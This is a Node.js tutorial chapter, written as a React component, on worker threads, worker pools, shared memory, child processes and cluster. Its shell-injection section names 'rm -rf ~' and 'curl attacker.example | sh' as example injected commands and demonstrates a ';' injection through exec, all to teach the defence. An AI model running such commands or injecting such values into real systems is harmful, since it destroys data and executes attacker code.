import { CodeFile, Terminal } from '../components/Code';
import { Box, ChapterIntro, Checkpoint, Exercises, Output, Recap, Step, TableWrap } from '../components/Content';
import { Diagram } from '../diagrams/Diagram';
import { workerPool } from '../diagrams/specs/advanced';

export function Concurrency() {
  return (
    <>
      <ChapterIntro
        time="2.5–3 hours"
        project="10-cpu-lab"
        learn={[
          'The difference between concurrency and parallelism, and which one Node gives you for free',
          'How one CPU-heavy request slows every other request, measured with real HTTP calls',
          'Worker threads: starting them, passing data in and out, handling their errors',
          'What structured cloning copies, and how transferring a buffer avoids the copy',
          'A fixed-size worker pool with a task queue, crash recovery and graceful shutdown',
          'Shared memory with SharedArrayBuffer and Atomics, and why you rarely need it',
          'Child processes: exec, execFile, spawn and fork, and the shell injection trap',
          'Cluster, worker threads or more containers: which one to use when',
        ]}
        tools={[
          { name: 'node:worker_threads', what: 'Runs JavaScript on extra threads inside the same process.' },
          { name: 'node:child_process', what: 'Starts other programs, or other Node processes, and talks to them.' },
          { name: 'node:cluster', what: 'Runs several copies of a server process that share one port.' },
          { name: 'os.availableParallelism()', what: 'How many threads can usefully run at the same time on this machine.' },
          { name: 'Atomics', what: 'Indivisible operations on memory that several threads share.' },
        ]}
      />

      <h2>Concurrency is not parallelism</h2>
      <div className="prose">
        <p>
          <strong>Concurrency</strong> means making progress on many tasks over the same period, by switching between
          them. <strong>Parallelism</strong> means running several tasks at literally the same instant, on different CPU
          cores. A single cook with four pans on the stove is concurrent. Four cooks are parallel.
        </p>
        <p>
          Node gives you concurrency for free: while one request waits for the database, the event loop runs another.
          That works because waiting costs no CPU. It stops working the moment a task needs the CPU for a long time,
          because your JavaScript runs on one thread and that thread can only compute one thing at a time. For that you
          need parallelism, and you have to ask for it.
        </p>
      </div>
      <TableWrap>
        <thead>
          <tr><th>The work</th><th>Example</th><th>What to use</th></tr>
        </thead>
        <tbody>
          <tr><td>Waiting for I/O</td><td>Database query, HTTP call, reading a file</td><td>Nothing extra: the async APIs already let other work run while you wait</td></tr>
          <tr><td>CPU work Node does in C++</td><td><code>crypto.scrypt</code>, <code>crypto.pbkdf2</code>, <code>zlib.gzip</code></td><td>The async versions already run on libuv's thread pool (chapter 07). Never call their <code>Sync</code> versions in a server</td></tr>
          <tr><td>CPU work in your JavaScript</td><td>Image resizing in JS, big JSON transforms, parsing, maths</td><td><strong>Worker threads</strong></td></tr>
          <tr><td>Another program</td><td><code>git</code>, <code>ffmpeg</code>, a Python script</td><td><strong>Child processes</strong></td></tr>
          <tr><td>More requests per second for the whole server</td><td>Using all 8 cores of a machine</td><td><strong>Several processes</strong>: cluster, or more containers behind a load balancer</td></tr>
        </tbody>
      </TableWrap>

      <Step n={1}>Set up the project</Step>
      <div className="prose">
        <p>
          Create <code>projects/10-cpu-lab</code> as in chapter 03: copy <code>tsconfig.json</code>,{' '}
          <code>.gitignore</code> and <code>.node-version</code>, run <code>npm install --save-dev typescript @types/node@24</code>,
          then use this <code>package.json</code>. There are no runtime dependencies: everything in this chapter is
          built into Node.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/package.json" />
      <div className="prose">
        <p>
          The CPU work is a deliberately slow Fibonacci function. It calls itself about 1.6<sup>n</sup> times, so each
          step up in <code>n</code> costs about 60% more time. It stands in for any heavy calculation.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/fib.ts" />
      <CodeFile path="10-cpu-lab/src/params.ts" />

      <Step n={2}>A server that blocks</Step>
      <div className="prose">
        <p>
          This server has a cheap endpoint, <code>/ping</code>, and an expensive one, <code>/fib?n=42</code>, which
          computes on the main thread. Port 3150 is used so it does not clash with other projects.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/blocking-server.ts" />
      <div className="prose">
        <p>
          You need numbers, not a feeling, so write a small measuring script. It sends one slow request and pings every
          100 ms until the slow one answers, then sends four slow requests at once. It uses the built-in{' '}
          <code>fetch</code>, so there is nothing to install.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/measure.ts" />
      <Terminal>{`
npm run blocking              # terminal 1
npm run measure -- 3150 42    # terminal 2`}</Terminal>
      <Output>{`
1) One /fib?n=42 request, with a /ping every 100 ms while it runs
   /fib answered after 1574 ms
   ping 1: 1458 ms
2) Four /fib?n=42 requests at the same time
   each took 1576, 3103, 4652, 6234 ms; all four done after 6235 ms`}</Output>
      <div className="prose">
        <p>
          Your numbers will differ with your CPU, but the pattern will not. The ping, which needs microseconds of work,
          waited <strong>1458 ms</strong>: it arrived while <code>fib(42)</code> held the thread, and its callback could
          not run until <code>fib</code> returned. The four slow requests ran strictly one after another, so the last
          user waited more than six seconds. Every endpoint of this server is now as slow as its slowest one.
        </p>
      </div>
      <Box kind="warn" label="This is the bug interviewers ask about">
        <p>
          "Our Node API gets slow under load but CPU is at 100% on one core only" is almost always synchronous CPU work
          on the main thread: <code>JSON.parse</code> on a huge body, <code>bcrypt</code>/<code>scrypt</code> in their{' '}
          <code>Sync</code> form, a regular expression that backtracks badly, or an O(n²) loop. Chapter 17 shows how to
          find which one with a CPU profile.
        </p>
      </Box>

      <h2>Worker threads</h2>
      <div className="prose">
        <p>
          A <strong>worker thread</strong> is a second JavaScript environment inside the same process: its own V8
          isolate (a separate heap and garbage collector), its own event loop, and its own copy of every module it
          imports. It runs truly in parallel with the main thread on another core. Because nothing is shared by
          default, there are no data races on ordinary objects. The two sides talk by sending <strong>messages</strong>.
        </p>
      </div>
      <TableWrap>
        <thead>
          <tr><th></th><th>Main thread</th><th>Worker thread</th></tr>
        </thead>
        <tbody>
          <tr><td>Starts with</td><td><code>node file.ts</code></td><td><code>new Worker(url, {'{ workerData }'})</code></td></tr>
          <tr><td>Knows it is…</td><td><code>isMainThread === true</code>, <code>threadId === 0</code></td><td><code>isMainThread === false</code>, <code>threadId</code> 1, 2, …</td></tr>
          <tr><td>Initial data</td><td>—</td><td><code>workerData</code>, a structured clone of what you passed</td></tr>
          <tr><td>Send a message</td><td><code>worker.postMessage(value)</code></td><td><code>parentPort.postMessage(value)</code></td></tr>
          <tr><td>Receive</td><td><code>worker.on('message', …)</code></td><td><code>parentPort.on('message', …)</code></td></tr>
          <tr><td>Uncaught exception</td><td>Crashes the process</td><td>Stops that worker; the main thread gets an <code>'error'</code> event, then <code>'exit'</code></td></tr>
          <tr><td>Stop it</td><td>—</td><td><code>worker.terminate()</code> from outside, or the worker runs out of work</td></tr>
          <tr><td>Shares with the other side</td><td colSpan={2}>The process, its environment, file descriptors, and only the memory you explicitly share (<code>SharedArrayBuffer</code>)</td></tr>
        </tbody>
      </TableWrap>

      <Step n={3}>Your first workers</Step>
      <div className="prose">
        <p>
          The worker file reads its input from <code>workerData</code>, computes, posts the answer and finishes. Node 24
          runs <code>.ts</code> worker files with the same type stripping as the main file.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/fib-worker.ts" />
      <div className="prose">
        <p>
          The main script wraps one worker in a promise, then runs four at once with <code>Promise.all</code>. A 10 ms
          interval counts how often the main thread got to run a callback meanwhile. At the end it starts a worker
          with bad input to see how errors travel.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/worker-basics.ts" />
      <Terminal>{`node src/worker-basics.ts`}</Terminal>
      <Output>{`
main: isMainThread=true, threadId=0
[
  { threadId: 1, n: 40, value: 102334155 },
  { threadId: 2, n: 40, value: 102334155 },
  { threadId: 3, n: 40, value: 102334155 },
  { threadId: 4, n: 40, value: 102334155 }
]
4 × fib(40) in 4 workers: 938 ms, main thread ticked 85 times
4 × fib(40) on the main thread: 2280 ms, main thread ticked 0 times
worker failed: RangeError: n must be 0 or more, got -1`}</Output>
      <div className="prose">
        <p>Three things to notice:</p>
        <ul>
          <li>
            <strong>Parallel speed-up.</strong> Four workers finished in about 0.9 s against 2.3 s on one thread. Not a
            full 4×: each worker must start and load its modules (about 30 ms here), V8 optimises <code>fib</code>{' '}
            separately in every thread, and CPUs usually run each core slower when several are busy.
          </li>
          <li>
            <strong>A free main thread.</strong> While the workers computed, the interval ran 85 times. During the
            single-threaded loop it ran zero times: that is the blocked server from step 2 in miniature.
          </li>
          <li>
            <strong>Errors cross the boundary.</strong> The <code>RangeError</code> thrown in the worker arrived in the
            main thread as an <code>'error'</code> event, with its name and message intact. Always listen for{' '}
            <code>'error'</code> and <code>'exit'</code>, or a crashed worker leaves a promise that never settles.
          </li>
        </ul>
      </div>
      <Box kind="warn" label="Workers are not free">
        <p>
          On this machine each worker took about 30 ms to start and added about 20 MB of memory. Starting one per
          request would add that cost to every request, and a burst of traffic could start hundreds. Start a fixed set
          once and reuse them: a <strong>pool</strong>, step 5.
        </p>
      </Box>

      <Step n={4}>What crosses the boundary: copy or transfer</Step>
      <div className="prose">
        <p>
          <code>postMessage</code> sends a <strong>structured clone</strong>: a deep copy made with the same algorithm as{' '}
          <code>structuredClone()</code>. Copying is safe, because the two threads can never touch the same object, but
          it costs time proportional to the data. For big binary data you can <strong>transfer</strong> an{' '}
          <code>ArrayBuffer</code> instead: ownership moves to the other thread, nothing is copied, and the sender's
          buffer becomes empty (<em>detached</em>).
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/echo-worker.ts" />
      <CodeFile path="10-cpu-lab/src/clone-cost.ts" />
      <Terminal>{`node src/clone-cost.ts`}</Terminal>
      <Output>{`
copy    : worker got 268435456 bytes in 85.9 ms; main thread now has 268435456 bytes
transfer: worker got 268435456 bytes in 0.1 ms; main thread now has 0 bytes`}</Output>
      <TableWrap>
        <thead>
          <tr><th>Value</th><th>After a structured clone</th></tr>
        </thead>
        <tbody>
          <tr><td>Numbers, strings, booleans, <code>null</code>, <code>undefined</code>, <code>BigInt</code></td><td>Copied</td></tr>
          <tr><td>Plain objects and arrays, nested</td><td>Deep-copied, including circular references</td></tr>
          <tr><td><code>Date</code>, <code>Map</code>, <code>Set</code>, <code>RegExp</code>, <code>Error</code></td><td>Copied and still the same type (an <code>Error</code> keeps its name and message)</td></tr>
          <tr><td><code>ArrayBuffer</code>, typed arrays, <code>Buffer</code></td><td>Copied, or moved for free when listed in the transfer list</td></tr>
          <tr><td>Class instances</td><td>Arrive as <strong>plain objects</strong>: fields survive, methods and prototype do not</td></tr>
          <tr><td>Functions, symbols, sockets</td><td>Throw <code>DataCloneError: () =&gt; 1 could not be cloned.</code></td></tr>
        </tbody>
      </TableWrap>
      <Box kind="tip" label="Send less">
        <p>
          The cheapest message is a small one. Send an id or a file path and let the worker load the data itself, or
          send numbers in a typed array you can transfer, rather than a large array of objects that must be copied.
        </p>
      </Box>

      <Step n={5}>A worker pool</Step>
      <div className="prose">
        <p>
          A <strong>pool</strong> starts a fixed number of workers once and feeds them tasks from a queue. Each worker
          handles one task at a time and then takes the next. Requests never wait for a worker to start, memory use is
          predictable, and a flood of requests becomes a longer queue instead of hundreds of threads fighting for the
          same cores.
        </p>
      </div>
      <Diagram spec={workerPool} caption="The main thread only routes requests and queues tasks, so it stays free to answer cheap requests while every worker is busy." />
      <div className="prose">
        <p>
          The pool worker stays alive and handles one task per message. It reports a bad input as a reply rather than
          throwing: one invalid request should not kill a thread that hundreds of other requests are about to use.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/pool-worker.ts" />
      <CodeFile path="10-cpu-lab/src/pool.ts" />
      <TableWrap>
        <thead>
          <tr><th>Design choice</th><th>Why</th></tr>
        </thead>
        <tbody>
          <tr><td><code>availableParallelism() - 1</code> workers</td><td>One thread per core the OS will give you, minus one for the main thread, which still handles all networking. More workers than cores only adds switching overhead.</td></tr>
          <tr><td>Private <code>#fields</code></td><td>Real JavaScript privacy, enforced at run time. TypeScript's <code>private</code> keyword is only a type check.</td></tr>
          <tr><td>Generic <code>WorkerPool&lt;T, R&gt;</code></td><td>The same pool works for any worker file: the type parameters describe what a task and a result look like.</td></tr>
          <tr><td><code>Reply</code> union with <code>ok</code></td><td>Task errors travel as data, so the worker survives them. A discriminated union forces the caller to check <code>ok</code> before reading <code>value</code>.</td></tr>
          <tr><td><code>'exit'</code> handler replaces the worker</td><td>If a worker crashes anyway (a bug, or out of memory), the pool heals itself and keeps its size.</td></tr>
          <tr><td><code>close()</code> drains first</td><td>Stops new tasks, waits for queued and running ones, then terminates. Nobody gets a half-finished answer during a deploy.</td></tr>
        </tbody>
      </TableWrap>

      <Step n={6}>The server, with the pool</Step>
      <CodeFile path="10-cpu-lab/src/pool-server.ts" />
      <Terminal>{`
npm run pooled                # terminal 1
npm run measure -- 3151 42    # terminal 2`}</Terminal>
      <Output panes={[
        { tag: 'terminal 1', text: 'Pooled server on http://localhost:3151 with 9 workers' },
        { tag: 'terminal 2', text: `1) One /fib?n=42 request, with a /ping every 100 ms while it runs
   ping 1: 16 ms
   ping 2: 1 ms
   ping 3: 1 ms
   …
   ping 14: 1 ms
   /fib answered after 1528 ms
   ping 15: 0 ms
2) Four /fib?n=42 requests at the same time
   each took 1764, 1793, 1789, 1757 ms; all four done after 1793 ms` },
      ]} />
      <div className="prose">
        <p>
          Same work, same machine. Pings stayed at about 1 ms while <code>fib(42)</code> ran (the first one paid for
          opening the connection). The four slow requests ran side by side and all finished in 1.8 s instead of 6.2 s.
          This machine has 10 cores, so the pool has 9 workers; yours may differ.
        </p>
        <p>
          Now test the shutdown. Send a dozen slow requests from another terminal and press <kbd>Ctrl</kbd>+<kbd>C</kbd>{' '}
          in the server's terminal while they run:
        </p>
      </div>
      <Terminal>{`for i in $(seq 12); do curl -s "localhost:3151/fib?n=42" & done; wait`}</Terminal>
      <Output>{`
Shutting down after 9 running and 3 queued task(s)
All workers stopped`}</Output>
      <div className="prose">
        <p>
          All twelve requests got their answer before the process exited: nine were running, three were waiting in the
          queue. <code>server.close()</code> stopped new connections while the open ones finished. Chapter 19 builds
          the same graceful shutdown for the tasks API.
        </p>
      </div>
      <Box kind="try" label="Try it">
        <ol>
          <li>Time 300 requests for <code>/fib?n=20</code> against each server. Here the pool was slightly slower (53 ms against 46 ms): for a task that takes microseconds, the message round trip costs more than the work. Workers pay off when a task takes milliseconds.</li>
          <li>Start the pool server with <code>new WorkerPool(url, 1)</code> and rerun the measurement. Pings stay fast, but the four slow requests queue up again. The pool protects responsiveness; only more workers buy throughput.</li>
          <li>In <code>pool-worker.ts</code>, add <code>if (n === 13) process.exit(1);</code> and request <code>/fib?n=13</code>. The request fails with "Worker exited during a task", and the pool starts a replacement, so the next request works.</li>
        </ol>
      </Box>

      <Step n={7}>Shared memory and Atomics</Step>
      <div className="prose">
        <p>
          A <code>SharedArrayBuffer</code> is the one way two threads can see the same bytes. Passing it in{' '}
          <code>workerData</code> or <code>postMessage</code> shares it instead of copying it. Sharing brings back the
          classic multithreading bug, the <strong>race condition</strong>: <code>counter + 1</code> is three steps
          (read, add, write), and another thread can write in between, so one of the updates is lost.{' '}
          <code>Atomics</code> provides operations that happen as one indivisible step.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/counter-worker.ts" />
      <CodeFile path="10-cpu-lab/src/shared-memory.ts" />
      <Terminal>{`
node src/shared-memory.ts
node src/shared-memory.ts`}</Terminal>
      <Output>{`
expected      4000000
plain + 1     1784919
Atomics.add   4000000
expected      4000000
plain + 1     780130
Atomics.add   4000000`}</Output>
      <div className="prose">
        <p>
          The plain counter lost between half and four fifths of its updates, and a different number each run: the
          signature of a race. The atomic counter is exact every time. <code>Atomics.wait</code> and{' '}
          <code>Atomics.notify</code> let one thread sleep until another signals it, which is how locks are built.
        </p>
      </div>
      <Box kind="tip" label="When to reach for shared memory">
        <p>
          Almost never in application code. Message passing is simpler and safe. Shared memory pays off when several
          workers must read one large data set (a big lookup table, an image) without each holding a copy, or for
          high-frequency signalling. If you do use it, put every shared write behind <code>Atomics</code>.
        </p>
      </Box>

      <h2>Child processes</h2>
      <div className="prose">
        <p>
          A <strong>child process</strong> is a separate program with its own memory, started by your process. Use it to
          run tools that are not JavaScript, or to isolate work so that a crash or memory leak cannot take down your
          server. <code>node:child_process</code> has four ways to start one:
        </p>
      </div>
      <TableWrap>
        <thead>
          <tr><th>Function</th><th>Runs</th><th>Shell?</th><th>Output</th><th>Use for</th></tr>
        </thead>
        <tbody>
          <tr><td><code>execFile(file, args)</code></td><td>A program</td><td>No</td><td>Buffered, delivered at the end (1 MB limit by default, <code>maxBuffer</code>)</td><td>Short commands with a small result: <code>git rev-parse HEAD</code></td></tr>
          <tr><td><code>exec(command)</code></td><td>A command line</td><td>Yes</td><td>Buffered, same limit</td><td>Your own fixed commands that need pipes or globs. Never with user input</td></tr>
          <tr><td><code>spawn(file, args)</code></td><td>A program</td><td>No, unless <code>shell: true</code></td><td>Streams, as it happens</td><td>Long-running or chatty programs: builds, <code>ffmpeg</code>, tailing logs</td></tr>
          <tr><td><code>fork(module)</code></td><td>Another Node process</td><td>No</td><td>Streams, plus a message channel</td><td>Node code that must be isolated in its own process</td></tr>
        </tbody>
      </TableWrap>

      <Step n={8}>execFile, exec and the shell injection trap</Step>
      <CodeFile path="10-cpu-lab/src/child-exec.ts" />
      <Terminal>{`node src/child-exec.ts`}</Terminal>
      <Output>{`
child node says: v24.21.0
exec:     "hello\\nINJECTED: this ran as a second command\\n"
execFile: "hello; echo INJECTED: this ran as a second command\\n"
failed with exit code 3, stderr "boom\\n"`}</Output>
      <div className="prose">
        <p>
          With <code>exec</code> the shell saw the <code>;</code> and ran a second command that came from the "user".
          Replace that <code>echo</code> with <code>rm -rf ~</code> or <code>curl attacker.example | sh</code> and you have
          a remote code execution hole: <strong>command injection</strong>, one of the most serious vulnerabilities a
          server can have. <code>execFile</code> passed the same text as one literal argument. The failing command shows
          that a non-zero exit code rejects the promise, with the output still attached.
        </p>
      </div>
      <Box kind="warn" label="The rule">
        <p>
          Never build a command string from input you do not control. Use <code>execFile</code> or <code>spawn</code>{' '}
          with an argument array. (On Windows, <code>echo</code> is built into <code>cmd.exe</code> rather than a
          program, so this exact demo needs a real executable there.)
        </p>
      </Box>

      <Step n={9}>spawn: stream the output</Step>
      <CodeFile path="10-cpu-lab/src/child-spawn.ts" />
      <Terminal>{`node src/child-spawn.ts`}</Terminal>
      <Output>{`
started child process 17292
[child] step 1 of 3
[child] step 2 of 3
[child] step 3 of 3
child exited with code 0`}</Output>
      <div className="prose">
        <p>
          Each line appeared as the child printed it, 300 ms apart. <code>child.stdout</code> is a readable stream
          (chapter 09), so <code>for await</code> works on it. The <code>stdio</code> option says what to do with the
          child's stdin, stdout and stderr: <code>'pipe'</code> gives you a stream, <code>'inherit'</code> shares your
          terminal, and <code>'ignore'</code> discards it. Wait for <code>'close'</code> rather than <code>'exit'</code>:{' '}
          <code>'close'</code> fires only after the output streams have been fully read.
        </p>
      </div>

      <Step n={10}>fork: another Node process with a message channel</Step>
      <CodeFile path="10-cpu-lab/src/ipc-child.ts" />
      <CodeFile path="10-cpu-lab/src/child-fork.ts" />
      <Terminal>{`node src/child-fork.ts`}</Terminal>
      <Output>{`
parent 17295 got { pid: 17296, n: 35, value: 9227465 }
child exited with code 0`}</Output>
      <div className="prose">
        <p>
          The API looks like a worker's, but this is a whole new process with a different pid. It costs more to start
          and uses more memory than a thread, and messages are serialised as JSON over a pipe. In return it is fully
          isolated: if the child crashes, leaks memory or calls <code>process.exit</code>, the parent is unaffected.
        </p>
      </div>

      <h2>Using every core for a whole server</h2>
      <div className="prose">
        <p>
          Worker threads offload <em>tasks</em>. To spread <em>requests</em> over all cores, run several copies of the
          whole server. The built-in <code>node:cluster</code> module starts copies (workers, but processes this time)
          that share one port. The primary process accepts connections and hands them out in turn.
        </p>
      </div>
      <CodeFile path="10-cpu-lab/src/cluster.ts" />
      <Terminal>{`
node src/cluster.ts                                       # terminal 1
for i in 1 2 3 4 5 6; do curl -s localhost:3152/; done    # terminal 2
curl -s localhost:3152/crash; curl -s localhost:3152/`}</Terminal>
      <Output panes={[
        { tag: 'terminal 2', text: `handled by process 17436
handled by process 17435
handled by process 17433
handled by process 17434
handled by process 17436
handled by process 17435
handled by process 17434` },
        { tag: 'terminal 1', text: `primary 17431 starting 4 workers
worker 17436 listening on 3152
worker 17433 listening on 3152
worker 17435 listening on 3152
worker 17434 listening on 3152
worker 17433 died (code 1), starting another
worker 17481 listening on 3152` },
      ]} />
      <div className="prose">
        <p>
          Requests rotated across the four processes, and the crashed worker was replaced automatically. Because each
          copy has its own memory, anything kept in a variable (sessions, caches, counters) is <em>not</em> shared
          between them. Keep that kind of state in a database or Redis.
        </p>
      </div>
      <TableWrap>
        <thead>
          <tr><th></th><th>Worker threads</th><th>cluster</th><th>More containers</th></tr>
        </thead>
        <tbody>
          <tr><td>Unit</td><td>Thread in one process</td><td>Process on one machine</td><td>Process on any machine</td></tr>
          <tr><td>Solves</td><td>One CPU-heavy task blocking the event loop</td><td>Using all cores of one machine for requests</td><td>Using many machines, plus zero-downtime deploys</td></tr>
          <tr><td>Memory</td><td>Separate heaps, optional shared buffers</td><td>Fully separate</td><td>Fully separate</td></tr>
          <tr><td>A crash takes down</td><td>That worker (or the process, if unhandled)</td><td>One process; the primary restarts it</td><td>One container; the orchestrator restarts it</td></tr>
          <tr><td>Typical today</td><td>Image, PDF, parsing and maths work inside an API</td><td>A single VM without containers</td><td>Kubernetes, ECS, Cloud Run: run one process per container and add replicas</td></tr>
        </tbody>
      </TableWrap>
      <Box kind="tip" label="What production teams usually do">
        <p>
          In containers, run <strong>one Node process per container</strong> and scale by adding replicas; the platform
          already restarts crashed processes and balances traffic, so cluster adds little. Inside each process, use a
          worker pool for any CPU-heavy endpoint.
        </p>
      </Box>

      <Exercises
        items={[
          {
            task: <>Give <code>pool.run()</code> an optional timeout: <code>pool.run(n, 2000)</code> rejects with "Task timed out after 2000 ms" if the task is still running, and stops that worker so the CPU is freed. The pool must still have 9 workers afterwards.</>,
            hint: <>Start a <code>setTimeout</code> when you dispatch the job and clear it when the reply arrives. JavaScript running in a thread cannot be interrupted from outside, so the only way to stop it is <code>worker.terminate()</code>; your <code>'exit'</code> handler already replaces dead workers. Ignore a late reply from a worker that has no job any more.</>,
            solution: <CodeFile path="10-cpu-lab.practice/src/pool.ts" />,
          },
          {
            task: <>Add a <code>GET /stats</code> endpoint to the pooled server that returns <code>{'{ size, running, queued }'}</code> as JSON. Watch it while the twelve-request loop runs.</>,
            hint: <>The pool needs a <code>running</code> getter (the size of <code>#busy</code>) next to <code>queued</code>.</>,
            solution: <CodeFile path="10-cpu-lab.practice/src/pool-server.ts" />,
          },
          {
            task: <>Write <code>src/typecheck-timer.ts</code>, which runs <code>npx tsc</code> with <code>spawn</code>, shows its output live, and finishes with "PASS" or "FAIL" plus the duration. Its own exit code should match tsc's, so it could gate a commit.</>,
            hint: <><code>stdio: 'inherit'</code> passes tsc's output straight through. <code>once(child, 'close')</code> resolves with the exit code. Set <code>process.exitCode</code> rather than calling <code>process.exit()</code>.</>,
            solution: <CodeFile path="10-cpu-lab.practice/src/typecheck-timer.ts" />,
          },
        ]}
      />

      <Checkpoint question={<>A login endpoint hashes passwords with <code>crypto.scryptSync</code>. During a marketing campaign, every endpoint, even <code>/health</code>, becomes slow. What is happening, and what are two fixes?</>}>
        <p>
          <code>scryptSync</code> is deliberately CPU-expensive and runs on the main thread, so while one login hashes, no
          other callback can run: every request queues behind it. Fix one: use the async <code>crypto.scrypt</code>,
          which runs the hashing on libuv's thread pool and leaves the event loop free (raise{' '}
          <code>UV_THREADPOOL_SIZE</code> if logins queue there). Fix two: move the work to a worker pool, which also
          suits CPU work that has no async built-in version.
        </p>
      </Checkpoint>
      <Checkpoint question="Why does adding a 20th worker to a pool on a 10-core machine make requests slower, not faster?">
        <p>
          Only about 10 threads can run at once. Twenty CPU-bound workers just take turns on the same cores, so each task
          takes longer, the OS spends time switching between threads, and each extra worker costs memory. Size a pool
          for the cores you have (<code>os.availableParallelism()</code>) and let extra tasks wait in the queue.
        </p>
      </Checkpoint>

      <Recap>
        <ul>
          <li>Node is concurrent by default (the event loop) and parallel only when you ask: worker threads, child processes or more processes.</li>
          <li>Synchronous CPU work on the main thread delays every request. Measure it with a cheap endpoint while the expensive one runs.</li>
          <li>Workers share nothing by default and talk with <code>postMessage</code>, which copies (structured clone) unless you transfer an <code>ArrayBuffer</code>.</li>
          <li>Reuse workers through a fixed-size pool with a queue; handle <code>'error'</code> and <code>'exit'</code>, and drain it on shutdown.</li>
          <li>Run other programs with <code>execFile</code> or <code>spawn</code> and an argument array; <code>exec</code> with user input is command injection.</li>
          <li>Scale requests across cores with more processes: cluster on a single machine, replicas in containers.</li>
        </ul>
      </Recap>
    </>
  );
}
